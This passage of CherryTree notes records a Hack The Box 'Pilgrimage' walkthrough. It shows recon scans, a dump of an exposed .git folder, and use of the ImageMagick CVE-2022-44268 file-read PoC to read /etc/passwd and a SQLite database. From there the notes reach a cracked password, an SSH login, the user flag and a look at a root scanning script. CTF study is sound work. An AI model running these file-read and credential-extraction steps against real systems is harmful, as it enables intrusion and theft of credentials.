        <rich_text link="webs http://pilgrimage.htb/">http://pilgrimage.htb/</rich_text>
        <rich_text>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
Nmap done: 1 IP address (1 host up) scanned in 25.17 seconds</rich_text>
      </node>
      <node name="buster" unique_id="21" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689323176" ts_lastsave="1689323563">
        <rich_text>feroxbuster -u </rich_text>
        <rich_text link="webs http://pilgrimage.htb/">http://pilgrimage.htb/</rich_text>
        <rich_text> -x php              

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ </rich_text>
        <rich_text link="webs http://pilgrimage.htb/">http://pilgrimage.htb/</rich_text>
        <rich_text>
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        7l        9w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       11w      169c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/tmp">http://pilgrimage.htb/tmp</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://pilgrimage.htb/tmp/">http://pilgrimage.htb/tmp/</rich_text>
        <rich_text>
200      GET      186l      505w     4928c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/css/owl.css">http://pilgrimage.htb/assets/css/owl.css</rich_text>
        <rich_text>
200      GET        5l       27w     1031c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/js/popup.js">http://pilgrimage.htb/assets/js/popup.js</rich_text>
        <rich_text>
200      GET      178l      395w     5292c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/js/custom.js">http://pilgrimage.htb/assets/js/custom.js</rich_text>
        <rich_text>
302      GET        0l        0w        0c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/dashboard.php">http://pilgrimage.htb/dashboard.php</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://pilgrimage.htb/login.php">http://pilgrimage.htb/login.php</rich_text>
        <rich_text>
200      GET       94l      234w     3576c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/css/custom.css">http://pilgrimage.htb/assets/css/custom.css</rich_text>
        <rich_text>
302      GET        0l        0w        0c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/logout.php">http://pilgrimage.htb/logout.php</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://pilgrimage.htb/">http://pilgrimage.htb/</rich_text>
        <rich_text>
200      GET      171l      403w     6166c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/login.php">http://pilgrimage.htb/login.php</rich_text>
        <rich_text>
200      GET      171l      403w     6173c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/register.php">http://pilgrimage.htb/register.php</rich_text>
        <rich_text>
301      GET        7l       11w      169c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets">http://pilgrimage.htb/assets</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/">http://pilgrimage.htb/assets/</rich_text>
        <rich_text>
200      GET     2349l     5229w    50334c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/css/templatemo-woox-travel.css">http://pilgrimage.htb/assets/css/templatemo-woox-travel.css</rich_text>
        <rich_text>
200      GET       11l      552w    57997c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/css/animate.css">http://pilgrimage.htb/assets/css/animate.css</rich_text>
        <rich_text>
200      GET        2l     1283w    86927c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/vendor/jquery/jquery.min.js">http://pilgrimage.htb/vendor/jquery/jquery.min.js</rich_text>
        <rich_text>
200      GET        7l      942w    60110c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/vendor/bootstrap/js/bootstrap.min.js">http://pilgrimage.htb/vendor/bootstrap/js/bootstrap.min.js</rich_text>
        <rich_text>
200      GET       15l     1928w   119998c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/js/isotope.min.js">http://pilgrimage.htb/assets/js/isotope.min.js</rich_text>
        <rich_text>
200      GET    16582l    60225w   485937c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/js/tabs.js">http://pilgrimage.htb/assets/js/tabs.js</rich_text>
        <rich_text>
200      GET     6805l    11709w   123176c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/css/fontawesome.css">http://pilgrimage.htb/assets/css/fontawesome.css</rich_text>
        <rich_text>
301      GET        7l       11w      169c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/images">http://pilgrimage.htb/assets/images</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/images/">http://pilgrimage.htb/assets/images/</rich_text>
        <rich_text>
301      GET        7l       11w      169c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/css">http://pilgrimage.htb/assets/css</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/css/">http://pilgrimage.htb/assets/css/</rich_text>
        <rich_text>
301      GET        7l       11w      169c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/js">http://pilgrimage.htb/assets/js</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/js/">http://pilgrimage.htb/assets/js/</rich_text>
        <rich_text>
200      GET        7l     2223w   194705c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/vendor/bootstrap/css/bootstrap.min.css">http://pilgrimage.htb/vendor/bootstrap/css/bootstrap.min.css</rich_text>
        <rich_text>
200      GET      198l      494w     7621c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/">http://pilgrimage.htb/</rich_text>
        <rich_text>
200      GET      198l      494w     7621c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/index.php">http://pilgrimage.htb/index.php</rich_text>
        <rich_text>
301      GET        7l       11w      169c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/vendor">http://pilgrimage.htb/vendor</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://pilgrimage.htb/vendor/">http://pilgrimage.htb/vendor/</rich_text>
        <rich_text>
301      GET        7l       11w      169c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/vendor/jquery">http://pilgrimage.htb/vendor/jquery</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://pilgrimage.htb/vendor/jquery/">http://pilgrimage.htb/vendor/jquery/</rich_text>
        <rich_text>
[####################] - 62s   240026/240026  0s      found:25      errors:0      
[####################] - 58s    30000/30000   521/s   </rich_text>
        <rich_text link="webs http://pilgrimage.htb/">http://pilgrimage.htb/</rich_text>
        <rich_text> 
[####################] - 58s    30000/30000   519/s   </rich_text>
        <rich_text link="webs http://pilgrimage.htb/tmp/">http://pilgrimage.htb/tmp/</rich_text>
        <rich_text> 
[####################] - 58s    30000/30000   518/s   </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/">http://pilgrimage.htb/assets/</rich_text>
        <rich_text> 
[####################] - 57s    30000/30000   523/s   </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/images/">http://pilgrimage.htb/assets/images/</rich_text>
        <rich_text> 
[####################] - 58s    30000/30000   521/s   </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/css/">http://pilgrimage.htb/assets/css/</rich_text>
        <rich_text> 
[####################] - 57s    30000/30000   523/s   </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/js/">http://pilgrimage.htb/assets/js/</rich_text>
        <rich_text> 
[####################] - 57s    30000/30000   530/s   </rich_text>
        <rich_text link="webs http://pilgrimage.htb/vendor/">http://pilgrimage.htb/vendor/</rich_text>
        <rich_text> 
[####################] - 56s    30000/30000   537/s   </rich_text>
        <rich_text link="webs http://pilgrimage.htb/vendor/jquery/">http://pilgrimage.htb/vendor/jquery/</rich_text>
      </node>
      <node name="nikto" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689323563" ts_lastsave="1689325964">
        <rich_text>nikto -h </rich_text>
        <rich_text link="webs http://pilgrimage.htb/">http://pilgrimage.htb/</rich_text>
        <rich_text>      
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.142.239
+ Target Hostname:    pilgrimage.htb
+ Target Port:        80
+ Start Time:         2023-07-14 04:26:09 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: </rich_text>
        <rich_text link="webs https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</rich_text>
        <rich_text>
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: </rich_text>
        <rich_text link="webs https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/">https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/</rich_text>
        <rich_text>
+ /: Cookie PHPSESSID created without the httponly flag. See: </rich_text>
        <rich_text link="webs https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies</rich_text>
        <rich_text>
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /login.php: Admin login page/section found.
+ /.git/index: Git Index file may contain directory listing information.
+ /.git/HEAD: Git HEAD file found. Full repo details may be present.
+ /.git/config: Git config file found. Infos about repo details may be present.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 7962 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2023-07-14 04:31:09 (GMT-4) (300 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested</rich_text>
      </node>
      <node name="exploit" unique_id="23" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689325964" ts_lastsave="1689341418">
        <rich_text>there is .git in </rich_text>
        <rich_text link="webs http://pilgrimage.htb/.git/">http://pilgrimage.htb/.git/</rich_text>
        <rich_text>

use GitTools
./gitdumper.sh </rich_text>
        <rich_text link="webs http://pilgrimage.htb/.git/">http://pilgrimage.htb/.git/</rich_text>
        <rich_text> ../../git


then see files in git (maybe need git checkout .)

./magick -version 
'Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 </rich_text>
        <rich_text link="webs https://imagemagick.org">https://imagemagick.org</rich_text>
        <rich_text>
Copyright: (C) 1999 ImageMagick Studio LLC
License: </rich_text>
        <rich_text link="webs https://imagemagick.org/script/license.php">https://imagemagick.org/script/license.php</rich_text>
        <rich_text>
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)


google ImageMagick 7.1.0-49 exploit

git clone </rich_text>
        <rich_text link="webs https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC">https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC</rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h3">Usage:</rich_text>
        <rich_text>



</rich_text>
        <rich_text scale="h4">Installing dependencies:</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace">1. $ apt-get install pngcrush imagemagick exiftool exiv2 -y</rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h4">Change the filename you want to read below:</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace">2. $ pngcrush -text a "profile" "/etc/passwd" </rich_text>
        <rich_text>hello.png


</rich_text>
        <rich_text scale="h4">Confirm everything worked perfectly</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace">3. $ exiv2 -pS pngout.png</rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h4">Trigger the PoC via convert or upload image to the vulnerable service:</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace">4. $ convert pngout.png gopro.png</rich_text>
        <rich_text>
we dont do this, we upload file to the VM then download the shrunk file and then do:

convert 64b111102f656.png test.png


</rich_text>
        <rich_text scale="h4">View content of file was read:</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace">5. $ identify -verbose </rich_text>
        <rich_text>test.png


'root:x:0:0:root:/root:/bin/bash\n
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n
bin:x:2:2:bin:/bin:/usr/sbin/nologin\n
sys:x:3:3:sys:/dev:/usr/sbin/nologin\n
sync:x:4:65534:sync:/bin:/bin/sync\n
games:x:5:60:games:/usr/games:/usr/sbin/nologin\n
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin\n
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash\n
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n
_laurel:x:998:998::/var/log/laurel:/bin/false\n




IN GIT FOLDER we find :

find . | grep -Ri sqlite
login.php:  $db = new PDO('sqlite:/var/db/pilgrimage');
index.php:        $db = new PDO('sqlite:/var/db/pilgrimage');
register.php:  $db = new PDO('sqlite:/var/db/pilgrimage');
dashboard.php:  $db = new PDO('sqlite:/var/db/pilgrimage');


use exploit on /var/db/pilgrimage

decode result in cyberchef

emily:abigchonkyboi123


ssh emily@pilgrimage.htb
emily@pilgrimage.htb's password: 
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jul 14 20:54:57 2023 from 10.10.14.22
-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
emily@pilgrimage:~$
emily@pilgrimage:~$ cat user.txt 
fac4c18f240b53f1de8c0a19aca77a8b


run linpeas

interesting files
/usr/bin/write.ul
/usr/sbin/malwarescan.sh


emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ cat /usr/sbin/malwarescan.sh
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
	filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
	binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
		if [[ "$binout" == *"$banned"* ]]; then
			/usr/bin/rm "$filename"
			break
		fi
	done
done


we use pspy in  /var/www/pilgrimage.htb/shrunk/

</rich_text>
      </node>
    </node>
  </node>
</cherrytree>
